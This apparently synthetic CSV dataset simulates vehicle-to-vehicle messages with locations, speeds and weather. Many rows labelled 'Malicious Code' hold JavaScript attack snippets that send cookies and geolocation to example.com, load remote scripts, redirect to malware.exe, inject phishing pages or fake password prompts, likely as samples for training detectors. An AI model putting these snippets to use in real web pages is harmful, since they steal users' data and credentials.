Timestamp,Vehicle_ID,Vehicle_Type,Latitude,Longitude,Speed,Message_Type,Message_Content,Weather_Condition
32:00.7,vehicle_76,motorcycle,47.69371539,-122.397012,71.6705469,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),foggy
37:19.3,vehicle_87,truck,47.63944251,-122.3576626,28.19205211,Malicious Code,location.href = 'https://example.com/malware.exe';,foggy
26:56.6,vehicle_26,truck,47.60924583,-122.3201359,54.77187223,Safety,Beware of Black ice.,snowy
51:37.9,vehicle_50,motorcycle,47.6856871,-122.3304362,114.9246941,Emergency Update,Power outage in your neighborhood.,snowy
36:07.9,vehicle_17,motorcycle,47.66423992,-122.3024537,86.98022795,Emergency Update,Bridge collapse nearby.,clear
20:48.0,vehicle_56,truck,47.63265447,-122.347086,37.4846506,Traffic Update,Severe traffic congestion on Route 66.,snowy
46:51.7,vehicle_28,car,47.67866844,-122.3679395,70.7419632,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",foggy
05:38.2,vehicle_85,car,47.69741798,-122.3796408,92.30829289,Emergency Update,Evacuation order in your locale.,rainy
46:55.2,vehicle_29,car,47.65219223,-122.3588163,47.81631758,Traffic Update,At-a-standstill traffic on Local Street.,snowy
03:03.2,vehicle_19,car,47.62683442,-122.3775159,111.5219398,Emergency Update,Road collapse in your locale.,rainy
28:56.8,vehicle_82,car,47.68196576,-122.3682018,42.44976866,Malicious Code,location.href = 'https://example.com/malware.exe';,rainy
42:26.5,vehicle_22,car,47.67189613,-122.3699031,58.37492564,Safety,Be on the lookout for Low visibility due to fog or smoke.,foggy
59:47.7,vehicle_50,motorcycle,47.68554368,-122.3840477,54.37908505,Emergency Update,Bridge collapse in your jurisdiction.,foggy
34:54.6,vehicle_72,truck,47.69848526,-122.3769049,28.98461459,Traffic Update,Gridlock on Lane.,clear
15:18.3,vehicle_73,car,47.63379707,-122.3048069,7.422006098,Traffic Update,Severe traffic congestion on Local Street.,clear
17:40.7,vehicle_19,car,47.63879112,-122.3072463,27.78892698,Traffic Update,Traffic bottleneck on Route 66.,rainy
53:30.1,vehicle_65,truck,47.64433708,-122.3470714,102.3466198,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,rainy
39:55.8,vehicle_91,truck,47.63311124,-122.3378902,101.5776056,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,foggy
49:33.5,vehicle_99,truck,47.65326379,-122.302456,63.38012134,Traffic Update,Severe traffic congestion on Autostrada A1.,rainy
50:55.5,vehicle_10,motorcycle,47.68092599,-122.3426706,53.8426673,Emergency Update,Chemical spill in your locale.,clear
07:26.1,vehicle_97,motorcycle,47.67894143,-122.3589587,0.350955498,Traffic Update,Traffic backup on M25.,clear
24:51.5,vehicle_30,car,47.6894259,-122.3878848,80.55886572,Traffic Update,Traffic bottleneck on Autostrada A1.,foggy
27:46.7,vehicle_76,truck,47.65092334,-122.395273,70.23071377,Emergency Update,Active shooter nearby.,foggy
24:47.8,vehicle_59,car,47.67034485,-122.327093,98.19788302,Safety,Be cautious of Road closures.,rainy
27:24.4,vehicle_90,car,47.66990677,-122.3793065,82.90029166,Safety,Exercise caution regarding Icy roads.,snowy
10:06.6,vehicle_21,motorcycle,47.64170043,-122.3336739,5.015147134,Safety,Stay informed about Road construction.,foggy
33:21.1,vehicle_45,motorcycle,47.609322,-122.3164728,90.87968669,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,snowy
47:21.2,vehicle_51,truck,47.6368815,-122.3466659,47.78882104,Emergency Update,Major traffic collision in your region.,foggy
14:20.7,vehicle_88,truck,47.65286041,-122.3582666,45.34743217,Emergency Update,Traffic diversion locally.,clear
28:02.1,vehicle_83,truck,47.63220016,-122.3011725,26.65141203,Malicious Code,location.href = 'https://example.com/malware.exe';,foggy
49:09.7,vehicle_18,motorcycle,47.63900329,-122.3751937,112.8691485,Traffic Update,Severe traffic congestion on Drive.,rainy
45:04.1,vehicle_7,motorcycle,47.67652153,-122.3245605,13.95566249,Safety,Be aware of Accidents.,rainy
21:20.2,vehicle_85,motorcycle,47.643625,-122.3301087,118.6475837,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),snowy
00:51.6,vehicle_54,motorcycle,47.64598342,-122.3256368,86.25803489,Safety,Take precautions against Accidents.,rainy
42:51.6,vehicle_91,truck,47.69665479,-122.3052747,32.46597824,Safety,Exercise caution regarding Fallen trees.,foggy
00:11.6,vehicle_91,motorcycle,47.68296269,-122.3584162,105.9093984,Emergency Update,Traffic accident locally.,clear
02:20.3,vehicle_78,car,47.69557283,-122.3984791,23.5107402,Safety,Be on the lookout for Road closures.,clear
34:34.3,vehicle_77,motorcycle,47.62852051,-122.3168448,24.08272493,Traffic Update,Slow traffic on A1.,clear
58:09.0,vehicle_40,car,47.61292481,-122.3777762,103.4351273,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,snowy
41:35.1,vehicle_16,motorcycle,47.64967956,-122.3664178,17.99828031,Safety,Take precautions against Construction zones.,rainy
23:22.9,vehicle_49,car,47.61969223,-122.3285749,37.91113095,Emergency Update,Major traffic collision nearby.,snowy
33:45.4,vehicle_8,car,47.63278642,-122.3306329,97.54349395,Safety,Stay away from Low visibility due to fog or smoke.,snowy
19:19.5,vehicle_16,motorcycle,47.61489339,-122.3177873,40.81581715,Emergency Update,Chemical spill in your vicinity.,snowy
44:24.4,vehicle_99,truck,47.60196661,-122.3999427,35.07512919,Safety,Look out for Slippery roads due to rain or snow.,clear
05:47.0,vehicle_15,truck,47.60082278,-122.3107318,115.0558413,Safety,Be aware of Detours.,foggy
22:29.1,vehicle_68,car,47.6381063,-122.3641796,29.11156206,Malicious Code,"prompt('Enter your password:', 'Password Required');",snowy
04:22.4,vehicle_11,car,47.68270213,-122.3175534,115.7015798,Traffic Update,Stop-and-go traffic on M25.,foggy
12:53.4,vehicle_42,truck,47.65569462,-122.3902648,93.63771642,Safety,Take precautions against Power outages.,foggy
41:24.9,vehicle_19,truck,47.65363429,-122.3584411,20.89334882,Emergency Update,Water crisis in your jurisdiction.,snowy
07:10.5,vehicle_90,truck,47.6781258,-122.31925,108.3910381,Emergency Update,Traffic accident in your jurisdiction.,rainy
42:22.9,vehicle_27,motorcycle,47.67373368,-122.3433279,27.82206523,Traffic Update,Traffic jam on Main Street.,clear
00:11.0,vehicle_96,motorcycle,47.66658084,-122.3485066,5.829637724,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,foggy
56:37.1,vehicle_99,motorcycle,47.65163516,-122.3437928,90.7797076,Emergency Update,Multi-vehicle accident in your immediate area.,snowy
03:05.8,vehicle_96,truck,47.640723,-122.3779077,79.37404448,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,foggy
36:04.8,vehicle_45,motorcycle,47.66638704,-122.315025,38.2122941,Traffic Update,Traffic backup on M25.,clear
31:03.8,vehicle_0,truck,47.6408041,-122.3579591,98.02732051,Safety,Be aware of Construction zones.,clear
44:21.1,vehicle_39,truck,47.67453976,-122.3865848,51.07103279,Safety,Exercise caution regarding Black ice.,rainy
48:57.4,vehicle_66,truck,47.65145684,-122.3824643,76.40756022,Safety,Be alert to Black ice.,clear
42:49.9,vehicle_73,car,47.65813363,-122.3967338,38.95150922,Emergency Update,Emergency traffic in your jurisdiction.,clear
18:57.4,vehicle_77,car,47.66714458,-122.3768569,89.58807871,Emergency Update,Chemical spill in your locale.,rainy
26:22.8,vehicle_78,truck,47.6504528,-122.3624354,19.44127076,Traffic Update,Heavy traffic on Interstate 40.,snowy
31:14.9,vehicle_9,truck,47.64873066,-122.3833116,42.73950618,Traffic Update,Traffic jam on I-95.,clear
53:45.9,vehicle_0,truck,47.68545609,-122.300235,28.70095642,Safety,Exercise caution regarding Fallen trees.,foggy
05:24.3,vehicle_73,motorcycle,47.64614004,-122.3248555,112.0294516,Traffic Update,Tailback on Boulevard.,snowy
03:46.6,vehicle_40,car,47.68675138,-122.3841822,58.81090305,Traffic Update,Traffic jam on Provincial Highway 1.,rainy
23:09.0,vehicle_46,motorcycle,47.61074785,-122.3712389,105.2622724,Safety,Take precautions against Slippery roads due to rain or snow.,foggy
40:24.0,vehicle_95,car,47.66917146,-122.3342386,2.134345621,Safety,Take precautions against Construction zones.,rainy
33:53.2,vehicle_24,car,47.60255383,-122.3968563,99.04140903,Traffic Update,Traffic bottleneck on County Road 1.,clear
52:49.6,vehicle_20,truck,47.67468302,-122.3540971,46.10634176,Traffic Update,Severe traffic congestion on M25.,snowy
34:28.2,vehicle_75,motorcycle,47.63975207,-122.3301592,35.93457604,Malicious Code,"prompt('Enter your password:', 'Password Required');",rainy
14:35.7,vehicle_68,motorcycle,47.61640027,-122.3917027,98.19734838,Traffic Update,Stop-and-go traffic on Avenue.,clear
29:31.1,vehicle_40,motorcycle,47.68927214,-122.3329056,113.5012518,Emergency Update,Evacuation order in your neighborhood.,snowy
47:48.2,vehicle_6,truck,47.63555836,-122.3542654,107.0712847,Emergency Update,Bridge collapse nearby.,clear
11:09.8,vehicle_43,motorcycle,47.68091094,-122.3474687,105.1636622,Emergency Update,Hazardous materials incident in your vicinity.,foggy
40:38.0,vehicle_96,car,47.64109119,-122.3422841,100.9305004,Emergency Update,Hazardous materials incident in your surrounding area.,snowy
13:13.0,vehicle_27,car,47.62745723,-122.3206661,56.14903863,Emergency Update,Road collapse locally.,rainy
37:15.2,vehicle_1,truck,47.67477167,-122.337974,1.057389832,Emergency Update,Active shooter in your locale.,foggy
44:08.9,vehicle_30,motorcycle,47.6719252,-122.3003326,64.92563689,Safety,Beware of Black ice.,foggy
05:27.3,vehicle_86,motorcycle,47.63852333,-122.3489356,21.88618368,Emergency Update,Infrastructure collapse in your vicinity.,clear
58:21.6,vehicle_66,truck,47.61191035,-122.3617406,24.17316718,Emergency Update,Terrorist attack in your locale.,snowy
15:11.0,vehicle_16,motorcycle,47.61268954,-122.341374,40.54292321,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",clear
58:09.1,vehicle_75,motorcycle,47.64889028,-122.3189012,13.0565468,Emergency Update,Emergency traffic in your part of town.,clear
13:54.2,vehicle_2,truck,47.64633935,-122.3555473,24.4248837,Traffic Update,Traffic is at a standstill on the northbound lanes of National Highway 1.,foggy
26:59.8,vehicle_84,truck,47.68717373,-122.3901264,117.0586116,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,foggy
55:01.7,vehicle_32,motorcycle,47.66182257,-122.3217437,9.582651825,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",clear
59:48.8,vehicle_62,car,47.67833837,-122.3392949,29.22337414,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
07:26.5,vehicle_48,truck,47.68068937,-122.3428969,12.06897809,Emergency Update,Civil unrest in your community.,clear
44:27.5,vehicle_38,truck,47.63536505,-122.3999038,70.79540422,Safety,Look out for Spills.,snowy
08:43.5,vehicle_93,truck,47.62001571,-122.3675482,76.08652509,Malicious Code,location.href = 'https://example.com/malware.exe';,clear
14:47.2,vehicle_85,car,47.61733393,-122.3840308,91.70530743,Emergency Update,Multi-vehicle accident locally.,clear
13:17.3,vehicle_27,motorcycle,47.68429536,-122.3202142,94.10666169,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,rainy
09:45.3,vehicle_72,car,47.6265836,-122.3071514,51.7425122,Safety,Look out for Accidents.,snowy
59:38.4,vehicle_78,truck,47.67567984,-122.3151271,18.42338506,Traffic Update,Traffic is at a standstill on the northbound lanes of Avenue.,rainy
51:13.6,vehicle_12,truck,47.67416147,-122.3701073,30.96806835,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,snowy
17:51.8,vehicle_25,car,47.6255739,-122.3611072,65.5009098,Safety,Avoid Low visibility due to fog or smoke.,clear
11:48.9,vehicle_28,truck,47.65533455,-122.3635206,2.482967179,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,snowy
49:41.4,vehicle_70,truck,47.68621722,-122.301501,38.2059257,Safety,Be alert to Inclement weather.,clear
04:02.2,vehicle_16,truck,47.69379579,-122.3921707,57.61025596,Emergency Update,Detour due to emergency in your vicinity.,clear
49:04.6,vehicle_56,truck,47.64190322,-122.3843732,88.34999896,Traffic Update,At-a-standstill traffic on Provincial Highway 1.,clear
13:15.7,vehicle_43,car,47.66131713,-122.3040796,44.06902503,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,rainy
12:54.0,vehicle_40,truck,47.63945495,-122.3502045,25.43493317,Safety,Be alert to Detours.,snowy
05:57.5,vehicle_4,truck,47.6640191,-122.3716286,101.2282346,Emergency Update,Chemical spill in your region.,snowy
29:39.4,vehicle_89,motorcycle,47.61206108,-122.3454901,54.84809588,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,foggy
15:07.5,vehicle_78,car,47.68827168,-122.3962183,9.086957387,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,rainy
07:39.5,vehicle_77,car,47.62199658,-122.3824853,8.648973194,Traffic Update,Gridlock on Bundesautobahn 1.,rainy
42:10.3,vehicle_92,motorcycle,47.65865528,-122.3947857,63.98964963,Traffic Update,Heavy traffic on Main Street.,snowy
12:27.2,vehicle_46,car,47.6770726,-122.3466557,53.71095057,Safety,Be alert to Slippery roads due to rain or snow.,snowy
26:09.7,vehicle_73,motorcycle,47.65038561,-122.336664,50.96980321,Traffic Update,Traffic backup on Provincial Highway 1.,foggy
14:10.3,vehicle_79,truck,47.64820603,-122.3769594,51.44670992,Emergency Update,Water crisis in your part of town.,rainy
23:51.4,vehicle_65,truck,47.65486227,-122.3658911,106.752255,Safety,Avoid Fallen trees.,snowy
07:42.9,vehicle_52,truck,47.60531663,-122.3329071,108.0292468,Traffic Update,Heavy traffic on Autostrada A1.,foggy
43:13.0,vehicle_46,motorcycle,47.62178822,-122.3817766,49.83567465,Safety,Be aware of Fallen trees.,clear
47:47.3,vehicle_60,truck,47.61484729,-122.3268727,51.87755133,Traffic Update,Severe traffic congestion on Drive.,clear
37:09.2,vehicle_87,truck,47.60158325,-122.3861232,9.578483511,Safety,Be aware of Spills.,snowy
08:47.3,vehicle_18,truck,47.67233817,-122.3465603,3.453539994,Safety,Take precautions against Low visibility due to fog or smoke.,clear
29:30.9,vehicle_7,car,47.65797569,-122.3866718,106.8033921,Safety,Take precautions against Road construction.,rainy
25:35.3,vehicle_9,truck,47.6484877,-122.3710922,104.0370567,Emergency Update,Active shooter in your immediate area.,foggy
31:49.2,vehicle_68,motorcycle,47.65884359,-122.3530631,6.842126959,Emergency Update,Traffic diversion in your community.,clear
25:20.6,vehicle_9,car,47.67540582,-122.3413649,97.28606041,Safety,Be cautious of Detours.,clear
37:05.2,vehicle_35,truck,47.64092584,-122.3158973,94.06798477,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
45:03.1,vehicle_89,car,47.69798132,-122.3911323,97.16953353,Traffic Update,Traffic backup on Autostrada A1.,rainy
59:24.6,vehicle_32,car,47.66591619,-122.3639444,99.6562284,Traffic Update,Heavy congestion on US-101.,snowy
17:46.9,vehicle_40,motorcycle,47.67282056,-122.3452531,73.20023395,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",clear
32:24.6,vehicle_78,motorcycle,47.6525644,-122.3897945,88.13961171,Traffic Update,Traffic backup on US-101.,foggy
06:03.3,vehicle_89,motorcycle,47.60992086,-122.33966,0.0135837,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,foggy
39:15.5,vehicle_12,car,47.69700455,-122.3175509,70.80632777,Traffic Update,Traffic jam on Interstate 40.,clear
20:20.1,vehicle_71,truck,47.642168,-122.359687,13.78772164,Traffic Update,Traffic backup on US-101.,clear
03:06.6,vehicle_21,motorcycle,47.65703992,-122.3692176,34.3689967,Emergency Update,Road collapse locally.,rainy
46:27.9,vehicle_19,truck,47.69218708,-122.3462939,95.27115601,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,snowy
44:40.6,vehicle_59,truck,47.65851474,-122.3197811,85.87375098,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,snowy
14:40.1,vehicle_79,truck,47.66428847,-122.3962335,15.64718454,Malicious Code,"prompt('Enter your password:', 'Password Required');",foggy
13:51.5,vehicle_98,motorcycle,47.62701871,-122.3684194,16.61398476,Traffic Update,At-a-standstill traffic on Boulevard.,foggy
22:59.6,vehicle_68,truck,47.6839422,-122.3226744,60.45375585,Emergency Update,Major traffic collision in your region.,snowy
02:59.0,vehicle_8,car,47.60561805,-122.3649509,71.06465579,Safety,Look out for Construction zones.,rainy
